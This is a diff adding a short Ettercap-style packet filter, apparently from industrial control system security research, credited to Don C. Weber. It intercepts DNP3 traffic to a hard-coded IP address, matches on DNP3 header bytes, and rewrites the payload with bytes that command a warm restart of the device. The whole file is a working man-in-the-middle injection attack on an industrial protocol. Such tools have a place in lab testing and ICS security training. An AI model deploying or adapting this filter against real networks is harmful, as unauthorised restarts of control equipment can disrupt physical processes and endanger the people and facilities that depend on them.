@@ -1,0 +1,22 @@
+###########################################
+# Name: dnp3-warm-restart.filter
+# Description: Initiate a warm restart
+#
+# Created by: Don C. Weber (@cutaway)
+# Date Created: November 2022
+# Version: 0.1
+###########################################
+
+# Checking to see if the destination is the server and the protocol is DNP3
+# Note: The IP address will need to be updated for your server
+if (ip.dst == '192.168.0.21' && tcp.src == 20000) {
+
+	# Check for DNP3 message and a DNP3 data with Application control of sequence 0x00. 
+    if (DATA.data == "\x05\x64" && DATA.data + 11 == "\xc0"){
+        # Overwrite DNP3 packet data by replacing everything
+        pcre_regex(DATA.data + 10,"*", "\xc0\xc0\x0e\x7e\xdc");
+    	# Printing a message when the filter fires.
+    	msg("Updated DNP3 data with \xc0\xc0\x0e\x7e\xdc for a warm restart");
+    }
+}
+
